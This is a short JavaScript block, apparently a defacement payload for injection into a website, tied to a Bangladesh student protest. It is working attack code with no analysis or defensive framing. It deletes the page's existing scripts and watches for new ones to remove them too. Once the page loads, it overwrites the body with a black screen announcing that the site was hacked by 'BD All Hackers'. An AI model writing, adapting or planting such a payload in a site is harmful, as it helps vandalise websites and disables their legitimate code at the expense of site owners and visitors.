<script>
    // Disable any existing scripts
    document.querySelectorAll('script').forEach(script => {
        if (!script.src.includes('replace.js')) {
            script.remove();
        }
    });

    // Disable any new script elements added to the DOM
    const observer = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
            mutation.addedNodes.forEach(node => {
                if (node.nodeName === 'SCRIPT' && !node.src.includes('replace.js')) {
                    node.remove();
                }
            });
        });
    });

    observer.observe(document, { childList: true, subtree: true });

    // Your deface script
    function deface() {
        document.body.innerHTML = `
            <style>
                body {
                    background-color: black;
                    color: white;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    font-family: Arial, sans-serif;
                }
            </style>
            <h1>Site Defaced by [Bangladesh Students]</h1>
            <h2> Save Bangladesh Students | আমার ভাই মরলো কেন? </h2>
            <p> Hacked By BD All Hackers </p>
        `;
    }

    // Wait until the document is fully loaded before running the deface function
    document.addEventListener('DOMContentLoaded', deface);
</script>
